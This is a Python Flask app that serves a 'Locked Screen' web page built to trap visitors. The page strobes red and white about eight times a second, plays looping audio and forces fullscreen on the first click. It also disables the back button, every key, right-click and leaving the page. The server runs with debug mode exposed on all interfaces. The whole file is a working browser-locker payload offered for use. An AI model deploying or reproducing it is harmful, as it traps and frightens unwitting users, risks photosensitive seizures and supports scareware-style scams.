import os
from flask import Flask, render_template_string, send_from_directory

app = Flask(__name__, static_folder=os.getcwd())

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Locked Screen</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            user-select: none;
            -webkit-user-select: none;
        }
        
        html, body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background-color: #000;
            position: fixed;
            top: 0;
            left: 0;
            cursor: none;
        }

        .interaction-shield {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 99999;
            background: transparent;
        }

        /* Fast blinking overlay layout */
        .blinker {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 50;
            pointer-events: none;
            animation: strobe 0.12s infinite;
        }

        @keyframes strobe {
            0% { background-color: rgba(255, 0, 0, 0.35); }
            50% { background-color: rgba(255, 255, 255, 0.45); }
            100% { background-color: rgba(0, 0, 0, 0.6); }
        }
    </style>
</head>
<body>

    <div class="interaction-shield"></div>
    <div class="blinker"></div>

    <!-- Audio element configured for tu.mp3 (Muted to pass browser launch restrictions) -->
    <audio id="lockAudio" autoplay loop muted>
        <source src="/tu.mp3" type="audio/mp3">
    </audio>

    <script>
        const audio = document.getElementById('lockAudio');

        // Force audio loop to prime on load
        window.addEventListener('DOMContentLoaded', () => {
            audio.play().catch(err => console.log("Audio ready"));
        });

        // Activation function: Unmutes audio track and forces browser fullscreen
        const activateLocker = () => {
            audio.muted = false;
            audio.play();
            
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            } else if (document.documentElement.webkitRequestFullscreen) {
                document.documentElement.webkitRequestFullscreen();
            }
        };

        // Captures first click/tap to unmute audio and enter fullscreen lock mode
        document.addEventListener('click', activateLocker);
        document.addEventListener('touchstart', activateLocker);

        // Trap history navigation (Kills browser back buttons)
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.pushState(null, null, location.href);
        };

        // Standard lock unload confirmation warning
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
        });

        // Clear native desktop options
        document.addEventListener('contextmenu', e => e.preventDefault());

        // Standard keyboard input interception
        window.addEventListener('keydown', (e) => {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }, true);

        // Stop mobile scroll-to-refresh mechanics
        window.addEventListener('touchmove', (e) => {
            if (e.scale !== 1) { e.preventDefault(); }
        }, { passive: false });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

# Route configured specifically to serve tu.mp3 from the local folder
@app.route('/tu.mp3')
def serve_audio():
    return send_from_directory(os.getcwd(), 'tu.mp3')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=51000, debug=True)